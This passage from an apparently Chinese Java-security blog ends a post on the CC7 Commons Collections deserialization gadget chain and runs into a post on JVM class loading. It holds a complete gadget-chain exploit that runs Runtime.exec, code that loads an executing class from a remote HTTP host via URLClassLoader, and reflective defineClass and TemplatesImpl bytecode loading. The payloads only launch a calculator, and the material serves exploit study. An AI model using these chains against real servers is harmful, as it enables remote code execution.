class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.AbstractMapEntryDecorator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.AbstractMapDecorator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.AbstractMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Hashtable;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC7</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(<span class=\"literal\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Map</span> <span class=\"variable\">Map1</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>();</span><br><span class=\"line\">        <span class=\"type\">Map</span> <span class=\"variable\">Map2</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Map</span> <span class=\"variable\">lazyMap1</span> <span class=\"operator\">=</span> LazyMap.decorate(Map1,chainedTransformer);</span><br><span class=\"line\">        lazyMap1.put(<span class=\"string\">&quot;Aa&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Map</span> <span class=\"variable\">lazyMap2</span> <span class=\"operator\">=</span> LazyMap.decorate(Map2, chainedTransformer);</span><br><span class=\"line\">        lazyMap2.put(<span class=\"string\">&quot;BB&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"type\">Hashtable</span> <span class=\"variable\">hashtable</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Hashtable</span>();</span><br><span class=\"line\">        hashtable.put(lazyMap1, <span class=\"number\">1</span>);</span><br><span class=\"line\">        hashtable.put(lazyMap2, <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        setFieldValue(chainedTransformer,<span class=\"string\">&quot;iTransformers&quot;</span>,transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        lazyMap2.remove(<span class=\"string\">&quot;Aa&quot;</span>);</span><br><span class=\"line\">        serialize(hashtable);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"mxmfB4ITL5a-o7QnS0PRM9aTZEqXct0WDG1YpBMCE6M.png\" alt=\"image\"></p>\n<h2 id=\"cc1-7的流程图\"><a href=\"#cc1-7的流程图\" class=\"headerlink\" title=\"cc1-7的流程图\"></a>cc1-7的流程图</h2><p><img src=\"SZLCk2zCDANXYVarX4RzOKVCuKycuR-a5h0kXLP1o08.jpg\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>主要讲了commons.collections4变化之后新的利用方式。很多都只是换了不同的入口，而后面的大部分都和前面学的链一致。其中最有意思的就是CC2了，它这里可以不使用Transformer数组来构造利用链。其它的利用链多半就是修改了头和其它的部分进行部分即可产生一种新的利用方式。</p>\n<p>参考：</p>\n<p>1.<a href=\"https://www.bilibili.com/video/BV1NQ4y1q7EU?t=1806.1\">https://www.bilibili.com/video/BV1NQ4y1q7EU?t=1806.1</a></p>\n<p>2.<a href=\"http://blog.m1kael.cn/index.php/archives/605/\">http://blog.m1kael.cn/index.php/archives/605/</a></p>\n","categories":["Java安全"],"tags":["漏洞复现","反序列化","CC链"]},{"title":"Java安全之类加载分析","url":"/2023/08/12/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%88%86%E6%9E%90/","content":"<h1 id=\"Java安全之类加载分析\"><a href=\"#Java安全之类加载分析\" class=\"headerlink\" title=\"Java安全之类加载分析\"></a>Java安全之类加载分析</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Java类加载是Java虚拟机（JVM）将类的字节码文件加载到内存，并在运行时动态创建类的过程。类加载是Java语言的核心机制之一，对于理解Java程序的执行过程至关重要。本文将介绍Java类加载的过程、测试和分析，同时探讨ClassLoader的使用、URLClassLoader的任意类加载以及defineClass方法的应用。最后，还会探讨TemplatesImpl和BCEL ClassLoader加载字节码的情况。</p>\n<h2 id=\"什么是类加载\"><a href=\"#什么是类加载\" class=\"headerlink\" title=\"什么是类加载?\"></a>什么是类加载?</h2><p>将类的字节码文件加载到内存中，并在运行时创建类的对象和执行类的方法的过程。</p>\n<p> javac是用于将源码文件.java编译成对应的字节码文件.class，其过程大致为:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">词法和语法分析----语义分析---中间代码生成---优化---生成目标代码</span><br></pre></td></tr></table></figure>\n<h2 id=\"类加载过程\"><a href=\"#类加载过程\" class=\"headerlink\" title=\"类加载过程\"></a>类加载过程</h2><ol>\n<li><p>加载（Loading）：加载是指将类的字节码文件从磁盘或网络读取到内存中的过程。当程序要使用某个类时，如果该类还没有被加载到内存中，JVM会通过类加载器查找并加载类的字节码文件。加载完成后，JVM会在内存中生成一个代表该类的Class对象。</p>\n</li>\n<li><p>验证（Verification）：验证是确保加载的类的字节码符合Java语言规范和安全性要求的过程。验证阶段包括对字节码的结构检查、语义检查、字节码的数据流分析等。</p>\n</li>\n<li><p>准备（Preparation）：准备是为类的静态变量分配内存并设置默认初始值的过程。在这个阶段，JVM为静态变量分配了内存空间，但还没有赋予初始值。</p>\n</li>\n<li><p>解析（Resolution）：解析是将常量池中的符号引用转换为直接引用的过程。在解析阶段，符号引用（如类、方法、字段的符号名称）会被替换为直接引用（在内存中的具体地址或指针）。</p>\n</li>\n<li><p>初始化（Initialization）：初始化是执行类构造器（）的过程，包括静态变量赋值和静态代码块的执行。在这个阶段，JVM会按照程序中的顺序执行类的静态变量赋值和静态代码块。</p>\n</li>\n<li><p>使用（Usage）：在初始化完成之后，就可以使用类了。使用包括创建类的实例、调用类的方法等操作。当程序需要使用某个类时，虚拟机会检查该类是否已经加载和初始化，如果没有，则会触发相应的加载和初始化操作。</p>\n</li>\n<li><p>卸载（Unloading）：在特定情况下，类可能会被从内存中卸载，释放资源。当一个类或类的Class对象不再被引用，并且没有任何其他活跃的引用链指向该类时，JVM会判定该类是可卸载的。类的卸载由垃圾回收器负责，它会在适当的时间进行类的卸载操作，释放内存资源</p>\n</li>\n</ol>\n<p><img src=\"3xl8X7M8u9UmLxralejNmiGKLGYrctINWOTHwamhhuE.png\" alt=\"image\"></p>\n<h2 id=\"类加载测试\"><a href=\"#类加载测试\" class=\"headerlink\" title=\"类加载测试\"></a>类加载测试</h2><p>先写一个student类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain3;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.Serializable;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span>: 2023/8/8</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Time</span>: 23:17</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Student</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> age;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">int</span> id;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;静态代码块&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">staticFunction</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;静态方法&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;构造代码块&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Student</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;无参构造函数Student&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Student</span><span class=\"params\">(String name, <span class=\"type\">int</span> age)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;有参构造函数Student&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Student&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;name=&#x27;&quot;</span> + name + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, age=&quot;</span> + age +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">action</span><span class=\"params\">(String act)</span> &#123;</span><br><span class=\"line\">        System.out.println(act);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>调用无参的构造方法 ：new Student</p>\n<p><img src=\"-zAd8oyRm726sUcHbk3zUd6FluARdlUvy4GcQJ4pHqU.png\" alt=\"image\"></p>\n<p>调用有参的构造方法 ：new Student(“张三”,18);</p>\n<p><img src=\"wJ096Z0qyEgwegdSdnaSx74lpdzMr4jlEPPTp2gyUx4.png\" alt=\"image\"></p>\n<p>Student.staticFunction();</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">静态代码块</span><br><span class=\"line\">静态方法</span><br></pre></td></tr></table></figure>\n<p>Student.id &#x3D; 18;</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">静态代码块</span><br></pre></td></tr></table></figure>\n<p>Class c &#x3D; Student.class;</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">无</span><br></pre></td></tr></table></figure>\n<h2 id=\"forName类加载分析\"><a href=\"#forName类加载分析\" class=\"headerlink\" title=\"forName类加载分析\"></a>forName类加载分析</h2><p>Class.forName(“com.garck3h.classloader.Student”);</p>\n<p><img src=\"Cyh0ZxwrelBeV3LqJRx7SlA0PxcCeWe4K0F7aJBzrZE.png\" alt=\"image\"></p>\n<p>调用了静态代码块，也就是说进行了初始化的操作。我们跟进去看一下是怎么实现的，发现是调用了forName0</p>\n<p><img src=\"0q4cMnfezUnNJefYXaxTbl5kuFyoXPAJb8T7tthEFmk.png\" alt=\"image\"></p>\n<p>继续跟进去看一下forName0</p>\n<p><img src=\"OsuXrFz0o5OMzrpO0-vrJXsh3rAdVUahmAW_m_rOaz0.png\" alt=\"image\"></p>\n<p>这上面还有一个完整版的重载的forname；name：要加载的类的全限定名；initialize：是否在加载类时执行类的静态初始化代码；loader：用于加载类的ClassLoader对象。</p>\n<p><img src=\"3tdljHp-mN6NVnJON8HXbTdWpTecd2y-No6SMZlMtz8.png\" alt=\"image\"></p>\n<p>我们调用一下这个重载的forname，我们在第二个参数里面设置了false，也就是不会进行初始化。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ClassLoader</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> ClassLoader.getSystemClassLoader();</span><br><span class=\"line\">Class.forName(<span class=\"string\">&quot;com.garck3h.classloader.Student&quot;</span>,<span class=\"literal\">false</span>,clazz);</span><br></pre></td></tr></table></figure>\n<p><img src=\"nRtvmCya6sLETQQ8fAb08oZNw5EGFNWozSbmumh944g.png\" alt=\"image\"></p>\n<p>进行实例化；发现可以都加载了。也就是说，forname是可以手动选择是否进行初始化的，底层也是使用的ClassLoader。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ClassLoader</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> ClassLoader.getSystemClassLoader();</span><br><span class=\"line\">Class&lt;?&gt; c = Class.forName(<span class=\"string\">&quot;com.garck3h.classloader.Student&quot;</span>,<span class=\"literal\">false</span>,clazz);</span><br><span class=\"line\">c.newInstance();</span><br></pre></td></tr></table></figure>\n<p><img src=\"z3lTSCPJAe_5As8CfNE2Meq9dmKxMZUC-fc7EeNMqTk.png\" alt=\"image\"></p>\n<h2 id=\"研究ClassLoader\"><a href=\"#研究ClassLoader\" class=\"headerlink\" title=\"研究ClassLoader\"></a>研究ClassLoader</h2><p>看一下我们之前获取到的系统当前的加载器的clazz，打印发现是Launcher里面的内置类：AppClassLoader</p>\n<p><img src=\"FKGoq2M8LS2VMS9vGUG_V3wzdoRER5b62fQF8_he60k.png\" alt=\"image\"></p>\n<p>此时需要引入Java的双亲委派模型：在这个模型中，每个类加载器都有一个父类加载器，当类加载器需要加载某个类时，它会首先委托给其父类加载器进行加载，只有在父类加载器无法加载该类时，才会由当前类加载器自己去加载。</p>\n<p>在Java中，有三种主要的类加载器：</p>\n<ol>\n<li>启动类加载器（Bootstrap Class Loader）：负责加载Java核心类库，它是由C++实现的，是整个类加载器层次结构的顶层。</li>\n<li>扩展类加载器（Extension Class Loader）：用来加载Java的扩展类库，默认情况下加载JAVA_HOME&#x2F;jre&#x2F;lib&#x2F;ext目录下的类库。</li>\n<li>应用程序类加载器（Application Class Loader）：也称为系统类加载器，负责加载应用程序的类，是开发者自定义的类加载器。它通常从CLASSPATH环境变量所指定的目录或JAR文件中加载类。</li>\n</ol>\n<p>当需要加载一个类时，一般会按照以下顺序进行委派： </p>\n<p>应用程序类加载器 -&gt; 扩展类加载器 -&gt; 启动类加载器</p>\n<p><img src=\"tZ1VpnuIOc5mAzxoQ0_no3Sb6-XxRthuPv9Js_pIkdg.png\" alt=\"image\"></p>\n<p><img src=\"4DulGl67t4mO4uvh_5sr-TK_y-L5-CkU1tbqaCBAsic.png\" alt=\"image\"></p>\n<p>跟进到ClassLoader</p>\n<p><img src=\"HMzV_RI1mDkCNTBCjpcJ31R5M_rvU8JuGt4519x8em4.png\" alt=\"image\"></p>\n<p>我们一直跟进(中间的忽略)，发现跟到了ClassLoader的defineClass完成了类的加载</p>\n<p><img src=\"huLCHQ_B_4lmXxitzqCR0ZMWDg8vXulFn2HLbE0LyX8.png\" alt=\"image\"></p>\n<p>这部分已经是C语言写的底层了，实现的是将给定的字节码数组转换成一个类，并生成对应的Class对象。</p>\n<p><img src=\"2dHQTh4oo_ISMFwGlCjZ64-XenxIWuLA0I5OCEGPcPA.png\" alt=\"image\"></p>\n<p>ctrl+h</p>\n<p><img src=\"xFJEuF_lwsoqp8bjH5UER0X0zSx_PpCe5JkMkdSDIDI.png\" alt=\"image\"></p>\n<h2 id=\"类加载机制总结\"><a href=\"#类加载机制总结\" class=\"headerlink\" title=\"类加载机制总结\"></a>类加载机制总结</h2><p>1、类加载与反序列化</p>\n<p>类加载的时候会执行代码</p>\n<p>初始化:静态代码块</p>\n<p>实例化：构造代码块、无参构造函数</p>\n<p>2、动态类加载方法</p>\n<p>Class.forname</p>\n<p>初始化&#x2F;不初始化</p>\n<p>ClassLoader.loadClass不进行初始化</p>\n<p>底层的原理，实现加载任意的类</p>\n<p>ClassLoader–SecureClassLoader–URLClassLoader–AppClassLoader</p>\n<p>loadClass–findClass–defineClass（从字节码加载）</p>\n<h2 id=\"URLClassLoaer任意类加载\"><a href=\"#URLClassLoaer任意类加载\" class=\"headerlink\" title=\"URLClassLoaer任意类加载\"></a>URLClassLoaer任意类加载</h2><p>我们实现以下从url里面加载类进行实例化。</p>\n<p>我们先创建一个弹计算器的类，然后Javac进行编译为class文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Calc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Calc</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"type\">Process</span> <span class=\"variable\">pc</span> <span class=\"operator\">=</span> Runtime.getRuntime().exec(<span class=\"string\">&quot;calc.exe&quot;</span>);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] argv)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Calc</span> <span class=\"variable\">e</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Calc</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后用python在编译好的目录起一个web</p>\n<p><img src=\"X71ufILQBCr2MQoNIqidrRMar1QBZsoM583e2VaTidU.png\" alt=\"image\"></p>\n<p>实现的代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;file:///D:\\\\down\\\\&quot;)&#125;);</span></span><br><span class=\"line\"><span class=\"comment\">//RLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;jar:file:///D:\\\\down\\\\Calc.jar!/&quot;)&#125;);</span></span><br><span class=\"line\"><span class=\"type\">URLClassLoader</span> <span class=\"variable\">urlClassLoader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URLClassLoader</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>[]&#123;<span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(<span class=\"string\">&quot;http://192.168.1.7/&quot;</span>)&#125;);</span><br><span class=\"line\">Class&lt;?&gt; clazz = urlClassLoader.loadClass(<span class=\"string\">&quot;Calc&quot;</span>);</span><br><span class=\"line\">clazz.newInstance();</span><br></pre></td></tr></table></figure>\n<p><img src=\"eJ6gMSQdpVPanxs7VvWoNPos4ltzlAy60MKgfJXSoXo.png\" alt=\"image\"></p>\n<h2 id=\"defineClass的使用\"><a href=\"#defineClass的使用\" class=\"headerlink\" title=\"defineClass的使用\"></a>defineClass的使用</h2><p>我们上面是跟到defineClass，然后在defineClass中直接实现了类加载。这里通过反射来调用它实现类加载。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ClassLoader</span> <span class=\"variable\">cl</span> <span class=\"operator\">=</span> ClassLoader.getSystemClassLoader();    <span class=\"comment\">//获取系统类加载器</span></span><br><span class=\"line\"><span class=\"comment\">//获取defineClass方法的引用</span></span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">defineClassMethod</span> <span class=\"operator\">=</span> ClassLoader.class.getDeclaredMethod(<span class=\"string\">&quot;defineClass&quot;</span>, String.class,<span class=\"type\">byte</span>[].class, <span class=\"type\">int</span>.class, <span class=\"type\">int</span>.class);</span><br><span class=\"line\">defineClassMethod.setAccessible(<span class=\"literal\">true</span>);  <span class=\"comment\">//设置访问权限为可访问</span></span><br><span class=\"line\"><span class=\"type\">byte</span>[] code = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;D:\\\\down\\\\Calc.class&quot;</span>));  <span class=\"comment\">//读取字节码文件的内容，将其存储在code字节数组中</span></span><br><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> (Class) defineClassMethod.invoke(cl, <span class=\"string\">&quot;Calc&quot;</span>, code, <span class=\"number\">0</span>, code.length);<span class=\"comment\">//传入类名Calc、字节码数组 code、长度</span></span><br><span class=\"line\">clazz.newInstance();</span><br></pre></td></tr></table></figure>\n<p><img src=\"Yf8HAti7SLF29B_2dZQa4TOS0jwtxfi6Z4CyTTEY-To.png\" alt=\"image\"></p>\n<p>这里我们就实现了传入字节码byte实现加载字节流里面的类来进行实例化，在不出网，不能调用url的时候，可以通过发送字节流来实现执行任意代码。</p>\n<p>不出网的时候，常用的两个方法：bcel、Templatesimpl；都是使用了defineClass动态加载类。</p>\n<p><img src=\"K9CLMKWMujpN0-UVD-USVNRfYtdkhCF2vdas8yGEx6E.png\" alt=\"image\"></p>\n<p>我们发现ClassLoader里面的defineClass () 被调用时是没有进行初始化的，即使是写在静态代码块static的也不可以。需要使用newInstance来调用其构造方法进行实例化。</p>\n<p><img src=\"5sqsgjtIA3jJsTy0gmHQ3UJDHg0DT3UFycWg1I7jW38.png\" alt=\"image\"></p>\n<p>使用newInstance即可调用构造函数来实例化</p>\n<p><img src=\"itxNPzl9Wk_b2vU9Mg5jxefj9s5ByG7tom4rg5WMPGY.png\" alt=\"image\"></p>\n<p>这个问题需要怎么解决呢？下面我们就来说一下另外这两种方式的加载。</p>\n<h2 id=\"TemplatesImpl加载字节码\"><a href=\"#TemplatesImpl加载字节码\" class=\"headerlink\" title=\"TemplatesImpl加载字节码\"></a>TemplatesImpl加载字节码</h2><p>上面我们说了defineClass一般很难利用到，所以我们这里就来说一下TemplatesImpl。</p>\n<p>在TemplatesImpl的 newTransformer是入口点</p>\n<p><img src=\"G1egDhi9zdSPtmSGyonp_JnnWg77llc4u59rfL5DREc.png\" alt=\"image\"></p>\n<p>跟进到getTransletInstance</p>\n<p><img src=\"P_bwi6HiJLHme5StH_ziJgM-4Sn42VdVDffQ_85FAYQ.png\" alt=\"image\"></p>\n<p>继续跟进defineTransletClasses，最终在414行里面调用了loader的defineClass</p>\n<p><img src=\"iYbDptLJn4Dnr6YwjGsiH1JzkBBxixDDhbjkd1EDZgg.png\" alt=\"image\"></p>\n<p>我们跟进去看看；发现它没有声明其作用域，所以具有默认的包级访问权限。</p>\n<p><img src=\"LXoDFm3AqJ3Q6EkdSowpWrnV2gLqsQn69Nu1-7qzeHg.png\" alt=\"image\"></p>\n<p>此时完整的利用链是：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">TemplatesImpl</span><br><span class=\"line\">    #newTransformer()</span><br><span class=\"line\">TemplatesImpl</span><br><span class=\"line\">    #getTransletInstance()</span><br><span class=\"line\">TemplatesImpl</span><br><span class=\"line\">    #defineTransletClasses()</span><br><span class=\"line\">TemplatesImpl</span><br><span class=\"line\">    TransletClassLoader</span><br><span class=\"line\">        #defineClass()</span><br></pre></td></tr></table></figure>\n<p>我们来尝试满足它的条件把该链利用起来。当走进getTransletInstance；需要满足_name不能为空null；_class需要等于 null</p>\n<p><img src=\"JrytkhCPQO275TPoq_S2PklXi7lpy9jZWbr_f1LRQTQ.png\" alt=\"image\"></p>\n<p>然后才可以进入到defineTransletClasses；紧接着是_bytecodes不能为空，</p>\n<p><img src=\"JYcErVIPpP07QgtymDN0_s0YkE_T38eJ2YQ2uXnj55Y.png\" alt=\"image\"></p>\n<p>然后就是再需要一个的TransformerFactoryImpl类型的_tfactory</p>\n<p><img src=\"ORCjfjHugt9w7ZfPcwZJMp7_efLNrhd70WQWj-55ATg.png\" alt=\"image\"></p>\n<p>这些属性都是私有的，所以我们需要通过反射来修改。写一个方法，把修改属性的代码封装起来。只要传入对象、属性名称和要设置属性值即可。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"type\">Field</span> <span 